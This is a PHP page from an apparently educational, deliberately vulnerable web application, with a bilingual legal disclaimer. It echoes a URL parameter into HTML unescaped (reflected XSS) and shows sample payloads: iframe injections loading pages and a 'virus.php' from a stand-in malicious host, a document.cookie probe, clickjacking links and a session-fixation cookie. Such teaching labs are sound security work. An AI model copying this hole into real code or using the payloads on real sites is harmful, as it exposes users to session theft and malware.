<?php
/*
Copyright (C) 2014 Enrique Rando

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

http://www.gnu.org/licenses/gpl-2.0.html

-------------------------------------------------------------------------
Este programa es software libre; puedes redistribuirlo y/o
modificarlo bajo la Licencia Pública General de GNU
en los términos enque está publicada por la Free Software Foundation; bien en la versión 2014
de la Licencia, o (a tu elección) cualquier versión posterior.

Este programa se distribuye con la esperanza de que pueda resultar de utilidad,
pero SIN GARANTÍA ALGUNA; ni siquiera la garantía implícita de tipo
COMERCIAL o de APLICABILIDAD A CUALQUIER PROPÓSITO PARTICULAR. Lea
la Licencia Pública General de GNU para obtener más detalles.

Deberías haber recibido una copia de la Licencia Pública General de GNU
junto con este programa; en caso contrario, escribe a la Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

http://www.gnu.org/licenses/gpl-2.0.html
-------------------------------------------------------------------------
Please, read this carefully:

This package consists of:
* A vulnerable application written in PHP / HTML
* A series of proofs of concept that allow experimenting with the application vulnerabilities. Please note that some of these proofs of concept have their own vulnerabilities or generate malware.
* Notes and lists of URLs to use when running proofs of concept

Note that:
* Under no circumstances should you install an application that has or may have vulnerabilities on a computer that is used for production purpouses or on a system whose security must be protected.

* The use of hacking techniques may constitute an offense under the legislation applicable in each case. Under no circumstances should you use these techniques without the express consent of the legally valid holders of the hardware and software equipment that could be affected.

* Under no circumstances should you perform any activity that would constitute a breach of applicable law.

Anyone not complying with this text will do so at their own risk and must bear the consequences. 


-------------------------------------------------------------------------

Por favor, lea detenidamente lo siguiente:

Este paquete consta de:
* Una aplicación vulnerable escrita en PHP / HTML
* Una serie de pruebas de concepto que permiten experimentar con las vulnerabilidades de dicha aplicación. Algunas de estas pruebas contienen sus propias vulnerabilidades o generan malware
* Notas y listas de URLs a utilizar en la ejecución de las pruebas de concepto

Ten en cuenta que:
* Bajo ninguna circunstancia se debe instalar una aplicación que tenga o pudiera tener vulnerabilidades en un equipo usado para explotación o en un sistema cuya seguridad se desee salvaguardar.

* El uso de técnicas de hacking puede constituir un delito según la normativa aplicable en cada caso. Bajo ninguna circunstancia se debe utilizar este tipo de técnicas sin el consentimiento expreso y legalmente válido de las personas titulares de los equipos físicos y lógicos que pudieran verse afectados.

* Bajo ninguna circunstancia se debe realizar ninguna actividad que pudiera suponer un incumplimiento de la normativa aplicable.

Cualquier persona que no se atuviera a lo expresado anteriormente lo hará bajo su propia responsabilidad y deberá atenerse a las consecuencias que pudieran tener sus actos.
*/


$nombre = isset($_GET["nombre"]) ? $_GET["nombre"] : "mundo";

print "<h1>Hola, $nombre</h1>";
?>


<br><a href="principal.php">Men&uacute; de la aplicaci&oacute;n</a><br><br><br>
<script>
function alterna(elemento) {
	if (document.getElementById(elemento).style.display=='inline') {
		document.getElementById(elemento).style.display='none';		
	} else {
		document.getElementById(elemento).style.display='inline';
	}
}
</script>

<button onclick="alterna('codigo')">MOSTRAR C&Oacute;DIGO FUENTE</button>
<br><br><br>
<button onclick="alterna('caso1')">MOSTRAR CASO 1</button>
<button onclick="alterna('caso2')">MOSTRAR CASO 2</button>
<button onclick="alterna('caso3')">MOSTRAR CASO 3</button>
<br><br>
<h3>IE</h3><button onclick="alterna('proteccion')">Protecci&oacute;n</button>
<button onclick="alterna('intento1')">Intento 1</button>
<button onclick="alterna('intento2')">Intento 2</button>
<br><br>
<button onclick="alterna('ID')">Cookies / Firefox</button>


<br><br><br>
<div id="codigo" style="display:none">
<table style="border:solid"><tr><td>
<h3> 
C&Oacute;DIGO FUENTE<hr>
<pre>
&lt;php
$nombre = isset($_GET["nombre"]) ? $_GET["nombre"] : "mundo";

print "&lt;h1&gt;Hola, $nombre&lt;/h1&gt;";
?&gt
</pre>
</h3></td></tr></table>
</div>
<h3 id="caso1"  style="display:none"><br><hr>http://webserver.example.com/aplicacion/hola_mundo.php?nombre=eres el visitante n%26uacute;mero 1.0000&lt;br>&lt;br>&lt;iframe style="width:580;height:240" src="http://malicioso.uhw/ataques/demo 06/1.htm">&lt;/iframe></h3>
<h3 id="caso2"  style="display:none"><br><hr>http://webserver.example.com/aplicacion/hola_mundo.php?nombre=Enrique&lt;iframe style="display:none" src='http://malicioso.uhw/ataques/demo 06/virus.php'></h3>
<h3 id="caso3"  style="display:none"><br><hr>http://webserver.example.com/aplicacion/hola_mundo.php?nombre=&lt;script>alert(document.cookie)&lt;/script></h3>
<h3 id="proteccion"  style="display:none"><hr><br>http://webserver.example.com/aplicacion/script_anti_clickjacking.htm</h3>
<h3 id="intento1"  style="display:none"><hr><br>http://malicioso.uhw/ataques/demo%2006/5.htm</h3>
<h3 id="intento2"  style="display:none"><hr><br>http://malicioso.uhw/ataques/demo%2006/6.htm</h3>
<h3 id="ID"  style="display:none"><br><hr>http://malicioso.uhw/ataques/demo%2006/7.htm<br><br>document.cookie="PHPSESSID=abcde; expires Thu, 31 Dec 2015; path=/"
</h3>
